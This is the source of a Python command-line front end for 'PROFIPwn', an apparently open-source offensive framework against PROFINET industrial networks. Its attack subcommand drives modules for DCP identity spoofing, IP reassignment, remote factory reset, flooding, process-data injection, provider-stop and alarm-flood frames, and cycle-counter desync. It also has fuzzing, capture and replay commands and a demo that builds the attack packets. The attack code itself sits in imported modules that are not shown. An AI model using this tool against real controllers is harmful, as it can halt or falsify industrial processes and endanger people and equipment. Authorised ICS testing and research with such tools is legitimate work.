#!/usr/bin/env python3
"""
PROFIPwn CLI — First Offensive Security Framework for PROFINET Industrial Ethernet
"""
import sys
import argparse


BANNER = r"""
  ██████╗ ██████╗  ██████╗ ███████╗██╗██████╗ ██╗    ██╗███╗   ██╗
  ██╔══██╗██╔══██╗██╔═══██╗██╔════╝██║██╔══██╗██║    ██║████╗  ██║
  ██████╔╝██████╔╝██║   ██║█████╗  ██║██████╔╝██║ █╗ ██║██╔██╗ ██║
  ██╔═══╝ ██╔══██╗██║   ██║██╔══╝  ██║██╔═══╝ ██║███╗██║██║╚██╗██║
  ██║     ██║  ██║╚██████╔╝██║     ██║██║     ╚███╔███╔╝██║ ╚████║
  ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝
  PROFINET Offensive Security Framework v1.0.0
  First open-source offensive tool for PROFINET industrial Ethernet
"""


def cmd_scan(args):
    from .discovery.scanner import PROFINETScanner
    import json

    scanner = PROFINETScanner(interface=args.interface, timeout=args.timeout)
    scanner.scan(use_scapy=args.scapy)
    if args.json:
        print(json.dumps([d.to_dict() for d in scanner.devices], indent=2))
    else:
        scanner.print_results()


def cmd_attack(args):
    from .attacks.dcp_attacks import DCPAttacks, print_attack_results
    from .attacks.rt_attacks import RTAttacks

    results = []

    if args.module in ("dcp-spoof", "dcp-ip", "factory-reset", "name-collision", "dcp-flood"):
        attacker = DCPAttacks(interface=args.interface)
        if args.module == "dcp-spoof":
            results.append(attacker.identity_spoof(
                args.target, args.name or "EVIL-PLC",
                spoofed_ip=args.ip or "", permanent=args.permanent,
            ))
        elif args.module == "dcp-ip":
            results.append(attacker.ip_manipulation(
                args.target, args.ip or "0.0.0.0", permanent=args.permanent,
            ))
        elif args.module == "factory-reset":
            results.append(attacker.factory_reset(args.target))
        elif args.module == "name-collision":
            results.append(attacker.name_collision(args.name or "collision-device", count=args.count))
        elif args.module == "dcp-flood":
            results.append(attacker.dcp_flood(args.target, count=args.count))

    elif args.module in ("rt-inject", "rt-stop", "rt-invalid", "alarm-flood", "rt-desync"):
        rt = RTAttacks(interface=args.interface)
        frame_id = args.frame_id or 0x8001
        if args.module == "rt-inject":
            data = bytes.fromhex(args.data) if args.data else b"\xFF" * 40
            results.append(rt.process_data_injection(args.target, frame_id, data, count=args.count))
        elif args.module == "rt-stop":
            results.append(rt.provider_stop_injection(args.target, frame_id, count=args.count))
        elif args.module == "rt-invalid":
            results.append(rt.data_invalid_injection(args.target, frame_id, count=args.count))
        elif args.module == "alarm-flood":
            results.append(rt.alarm_flood(args.target, count=args.count))
        elif args.module == "rt-desync":
            results.append(rt.cycle_counter_desync(args.target, frame_id, count=args.count))
    else:
        print(f"  [-] Unknown attack module: {args.module}")
        sys.exit(1)

    if args.json:
        import json
        print(json.dumps([{"attack": r.attack, "target": r.target,
                           "success": r.success, "detail": r.detail,
                           "packets_sent": r.packets_sent,
                           "duration": round(r.duration, 4)} for r in results], indent=2))
    else:
        print_attack_results(results)


def cmd_fuzz(args):
    from .fuzzer import PROFINETFuzzer

    fuzzer = PROFINETFuzzer(output_dir=args.output)

    if args.module == "dcp":
        cases = fuzzer.generate_dcp_fuzz_cases(args.count)
    elif args.module == "rt":
        cases = fuzzer.generate_rt_fuzz_cases(args.count)
    elif args.module == "all":
        cases = fuzzer.generate_all(args.count // 2, args.count // 2)
    else:
        print(f"  [-] Unknown fuzz module: {args.module}")
        sys.exit(1)

    fuzzer.save_cases(cases)

    if args.pcap:
        n = fuzzer.write_pcap(cases, args.pcap)
        print(f"\n  [+] Wrote {n} frames to {args.pcap}")

    if args.target:
        print(f"\n  [*] Running fuzz cases against: {args.target}")
        results = fuzzer.run_against_target(args.target)
        print(f"\n  [*] Results: {results['total']} tested, "
              f"{results['crashes']} crashes, {results['timeouts']} timeouts")


def cmd_capture(args):
    from .dissectors import PROFINETCapture
    print(f"\n  [*] Capturing PROFINET traffic on {args.interface} for {args.duration}s...")
    cap = PROFINETCapture()
    count = cap.capture_raw(
        interface=args.interface, duration=args.duration,
        frame_filter=args.frame_id,
    )
    if count > 0:
        cap.save_pcap(args.output)
        print(f"  [+] Captured {count} frames → {args.output}")
        cap.print_summary()
    else:
        print("  [*] No frames captured (raw sockets require root/CAP_NET_RAW)")


def cmd_replay(args):
    from .dissectors import PROFINETCapture
    cap = PROFINETCapture()
    count = cap.load_pcap(args.pcap)
    print(f"\n  [*] Loaded {count} frames from {args.pcap}")
    cap.print_summary()

    if args.dissect:
        return

    print(f"\n  [*] Replaying at {args.speed}x speed on {args.interface}...")
    sent = cap.replay(interface=args.interface, speed=args.speed)
    print(f"  [+] Replayed {sent} frames")


def cmd_decode(args):
    """Decode a PROFINET frame from hex."""
    from .dissectors import DissectedPacket
    from .protocols.profinet_dcp import build_ethernet_frame, DCP_MULTICAST_MAC
    raw = bytes.fromhex(args.hex_data.replace(" ", "").replace(":", ""))
    if len(raw) < 14:
        eth = build_ethernet_frame(DCP_MULTICAST_MAC, b"\x00" * 6, raw)
    else:
        eth = raw
    pkt = DissectedPacket(eth)
    print(f"\n  Summary: {pkt.summary}")
    for layer in pkt.layers:
        print(f"\n  [{layer['layer']}]")
        for k, v in layer.items():
            if k != "layer":
                print(f"    {k}: {v}")


def cmd_demo(args):
    """Run full demo — builds real DCP/RT packets and shows hex dumps."""
    import os
    from .protocols.profinet_dcp import (
        build_identify_request, build_set_name_request, build_set_ip_request,
        build_factory_reset_request, build_signal_request,
        build_ethernet_frame, DCP_MULTICAST_MAC,
    )
    from .protocols.profinet_rt import (
        RTFrame, AlarmFrame, build_rt_frame, build_alarm_frame,
        build_process_data_injection, build_provider_stop, build_data_invalid,
        DataStatus,
    )
    from .fuzzer import PROFINETFuzzer
    import random

    print("  " + "=" * 70)
    print("  PROFIPwn DEMO — Real Packet Construction")
    print("  " + "=" * 70)

    # Phase 1: DCP attack packets
    print("\n  [Phase 1] DCP Attack Packets")
    print("  " + "-" * 50)
    dcp_packets = [
        ("DCP Identify Request", build_identify_request(xid=0x41414141)),
        ("DCP Set Name (EVIL-PLC)", build_set_name_request("EVIL-PLC", xid=0x42424242, permanent=True)),
        ("DCP Set IP (0.0.0.0)", build_set_ip_request("0.0.0.0", "255.255.255.0", "0.0.0.0", xid=0x43434343)),
        ("DCP Factory Reset", build_factory_reset_request(xid=0x44444444)),
        ("DCP Signal (LED Flash)", build_signal_request(xid=0x45454545)),
    ]
    for name, pkt in dcp_packets:
        hex_preview = " ".join(f"{b:02x}" for b in pkt[:32])
        print(f"\n  [{name}] {len(pkt)} bytes")
        print(f"    Wire: {hex_preview}")

    # Phase 2: RT attack packets
    print("\n\n  [Phase 2] RT Attack Packets")
    print("  " + "-" * 50)
    rt_packets = [
        ("Process Data Injection", build_process_data_injection(0x8001, b"\xFF" * 40)),
        ("Provider Stop", build_provider_stop(0x8001)),
        ("Data Invalid", build_data_invalid(0x8001)),
    ]
    alarm = AlarmFrame(
        alarm_type=1, api=0, slot_number=1, subslot_number=1,
        module_ident=0xDEADBEEF, submodule_ident=0xCAFEBABE,
        alarm_specifier=0x0001, alarm_data=b"\x00" * 16,
    )
    rt_packets.append(("Alarm Frame", build_alarm_frame(alarm)))

    rt = RTFrame(frame_id=0x8001, io_data=b"\x00" * 40,
                  cycle_counter=0xFFF0, data_status=DataStatus.normal_running(),
                  transfer_status=0x00)
    rt_packets.append(("Cycle Counter Desync (0xFFF0)", build_rt_frame(rt)))

    for name, pkt in rt_packets:
        hex_preview = " ".join(f"{b:02x}" for b in pkt[:32])
        print(f"\n  [{name}] {len(pkt)} bytes")
        print(f"    Wire: {hex_preview}")

    # Phase 3: Dissection
    print("\n\n  [Phase 3] Packet Dissection")
    print("  " + "-" * 50)
    from .dissectors import DissectedPacket
    all_frames = [(n, build_ethernet_frame(DCP_MULTICAST_MAC, b"\x00\x11\x22\x33\x44\x55", p))
                  for n, p in dcp_packets + rt_packets]
    for name, eth in all_frames[:4]:
        pkt = DissectedPacket(eth)
        print(f"  {name}: {pkt.summary}")

    # Phase 4: Fuzzing
    print("\n\n  [Phase 4] Protocol Fuzzing")
    print("  " + "-" * 50)
    out_dir = args.output if hasattr(args, 'output') and args.output else "demo_fuzz_output"
    fuzzer = PROFINETFuzzer(output_dir=out_dir)
    cases = fuzzer.generate_all(200, 100)
    fuzzer.save_cases(cases)

    # Phase 5: pcap export
    print("\n\n  [Phase 5] PCAP Export")
    print("  " + "-" * 50)
    pcap_path = os.path.join(out_dir, "demo_cases.pcap")
    n_pcap = fuzzer.write_pcap(cases[:20], pcap_path)
    print(f"  [+] Wrote {n_pcap} fuzz frames to {pcap_path}")

    print("\n\n  " + "=" * 70)
    print("  DEMO COMPLETE — all data is real, no simulation")
    print(f"  DCP packets:  {len(dcp_packets)} built")
    print(f"  RT packets:   {len(rt_packets)} built")
    print(f"  Dissected:    {len(all_frames)} frames")
    print(f"  Fuzz cases:   {len(cases)} generated")
    print(f"  PCAP export:  {n_pcap} frames")
    total_bytes = sum(len(p) for _, p in dcp_packets) + sum(len(p) for _, p in rt_packets)
    print(f"  Total bytes:  {total_bytes}")
    print("  " + "=" * 70)


def main():
    parser = argparse.ArgumentParser(
        prog="profipwn",
        description="PROFIPwn — PROFINET Offensive Security Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    subparsers = parser.add_subparsers(dest="command")

    # scan
    p_scan = subparsers.add_parser("scan", help="Discover PROFINET devices")
    p_scan.add_argument("--interface", "-i", default="eth0")
    p_scan.add_argument("--timeout", "-t", type=float, default=3.0)
    p_scan.add_argument("--scapy", action="store_true", help="Use Scapy instead of raw sockets")
    p_scan.add_argument("--json", action="store_true", help="JSON output")

    # attack
    p_atk = subparsers.add_parser("attack", help="Run attack modules")
    p_atk.add_argument("module", choices=[
        "dcp-spoof", "dcp-ip", "factory-reset", "name-collision", "dcp-flood",
        "rt-inject", "rt-stop", "rt-invalid", "alarm-flood", "rt-desync",
    ])
    p_atk.add_argument("--target", help="Target MAC address")
    p_atk.add_argument("--interface", "-i", default="eth0")
    p_atk.add_argument("--name", help="Station name (for spoofing)")
    p_atk.add_argument("--ip", help="IP address")
    p_atk.add_argument("--permanent", action="store_true")
    p_atk.add_argument("--count", type=int, default=10)
    p_atk.add_argument("--frame-id", type=lambda x: int(x, 0), help="RT Frame ID (hex, e.g. 0x8001)")
    p_atk.add_argument("--data", help="Hex data for RT injection (e.g. FF00FF00)")
    p_atk.add_argument("--json", action="store_true", help="JSON output")

    # fuzz
    p_fuzz = subparsers.add_parser("fuzz", help="Fuzz PROFINET protocol handlers")
    p_fuzz.add_argument("--module", "-m", choices=["dcp", "rt", "all"], default="all")
    p_fuzz.add_argument("--output", "-o", default="fuzz_output")
    p_fuzz.add_argument("--count", "-c", type=int, default=500)
    p_fuzz.add_argument("--target", help="Target command to fuzz ({input} placeholder)")
    p_fuzz.add_argument("--pcap", help="Export fuzz cases to pcap file")

    # capture
    p_cap = subparsers.add_parser("capture", help="Capture PROFINET traffic to pcap")
    p_cap.add_argument("--interface", "-i", default="eth0")
    p_cap.add_argument("--duration", "-d", type=float, default=10.0)
    p_cap.add_argument("--output", "-o", required=True, help="Output pcap file")
    p_cap.add_argument("--frame-id", type=lambda x: int(x, 0), help="Filter by Frame ID")

    # replay
    p_rep = subparsers.add_parser("replay", help="Replay pcap file")
    p_rep.add_argument("pcap", help="Input pcap file")
    p_rep.add_argument("--interface", "-i", default="eth0")
    p_rep.add_argument("--speed", type=float, default=1.0, help="Replay speed multiplier")
    p_rep.add_argument("--dissect", action="store_true", help="Only dissect, don't replay")

    # decode
    p_dec = subparsers.add_parser("decode", help="Decode a PROFINET frame from hex")
    p_dec.add_argument("hex_data", help="Hex string of the frame to decode")

    # demo
    p_demo = subparsers.add_parser("demo", help="Run full demo with real packet generation")
    p_demo.add_argument("--output", "-o", default="demo_fuzz_output")

    args = parser.parse_args()
    print(BANNER)

    commands = {
        "scan": cmd_scan,
        "attack": cmd_attack,
        "fuzz": cmd_fuzz,
        "capture": cmd_capture,
        "replay": cmd_replay,
        "decode": cmd_decode,
        "demo": cmd_demo,
    }

    if args.command in commands:
        commands[args.command](args)
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
